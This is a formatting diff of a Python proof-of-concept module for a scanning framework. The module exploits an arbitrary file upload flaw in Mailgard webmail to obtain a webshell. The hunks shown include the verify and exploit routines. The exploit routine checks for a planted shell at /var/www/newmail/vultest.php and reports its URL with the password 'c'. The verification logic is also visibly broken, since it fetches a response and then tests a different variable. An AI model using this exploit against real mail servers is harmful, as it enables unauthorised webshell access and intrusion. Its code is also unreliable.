@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Mailgard_0003' # 平台漏洞编号，留空
+    vuln_id = 'Mailgard_0003'  # 平台漏洞编号，留空
     name = '佑友mailgard webmail任意文件上传导致getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-03-29'  # 漏洞公布时间
     desc = '''
         某些文件存在越权访问，无需登录即可访问，没有包含根目录下global.php的文件，都可以直接访问不会跳转到登陆界面。
@@ -33,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             o = urlparse.urlparse(self.target)
             host = o.hostname
@@ -80,7 +81,7 @@ Submit Query
             if code == 200:
                 verify_url = self.target + '/var/www/newmail/vultest.php'
                 r = requests.get(verify_url)
-                if '4a8a08f09d37b73795649038408b5f33' in body: 
+                if '4a8a08f09d37b73795649038408b5f33' in body:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -91,7 +92,7 @@ Submit Query
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             o = urlparse.urlparse(self.target)
             host = o.hostname
@@ -138,12 +139,13 @@ Submit Query
             if code == 200:
                 verify_url = self.target + '/var/www/newmail/vultest.php'
                 r = requests.get(verify_url)
-                if '4a8a08f09d37b73795649038408b5f33' in body: 
+                if '4a8a08f09d37b73795649038408b5f33' in body:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                         target=self.target, name=self.vuln.name, url=verify_url))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
